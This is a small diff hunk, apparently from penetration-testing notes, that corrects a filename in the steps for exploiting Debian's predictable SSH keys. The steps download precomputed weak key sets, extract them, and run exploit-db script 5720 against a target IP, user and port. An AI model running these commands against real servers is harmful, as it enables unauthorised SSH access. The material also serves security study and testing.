@@ -286,7 +286,7 @@ https://www.exploit-db.com/exploits/5720
 wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
 
 bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
-tar -xvf debian_ssh_dsa_2048_x86.tar
+tar -xvf debian_ssh_rsa_2048_x86.tar
 tar -xvf debian_ssh_dsa_1024_x86.tar
 
 python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
